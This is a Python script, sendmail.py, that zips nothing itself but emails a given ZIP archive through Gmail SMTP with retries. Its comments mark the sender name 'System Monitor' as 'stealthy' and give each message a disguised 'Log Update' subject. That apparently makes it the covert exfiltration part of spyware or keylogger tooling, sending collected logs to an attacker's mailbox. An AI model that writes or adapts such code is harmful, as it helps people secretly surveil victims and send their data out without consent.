# sendmail.py
import os
import smtplib
import logging
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email(zip_path, retries=3, delay=10):
    """Send the ZIP file via email with retries."""
    sender_email = "EMAIL_USER"  # Replace
    sender_password = "your_app_password"  # Replace (App Password for Gmail)
    receiver_email = "receiver_email@example.com"  # Replace

    for attempt in range(retries):
        try:
            msg = MIMEMultipart()
            msg['From'] = "System Monitor"  # Stealthy sender name
            msg['To'] = receiver_email
            msg['Subject'] = f"Log Update {int(time.time())}"  # Unique subject

            with open(zip_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(zip_path)}")
                msg.attach(part)

            with smtplib.SMTP('smtp.gmail.com', 587, timeout=30) as server:
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver_email, msg.as_string())
            logging.info(f"Email sent: {zip_path}")
            return True
        except Exception as e:
            logging.error(f"Email attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                logging.error("All email retries failed.")
                return False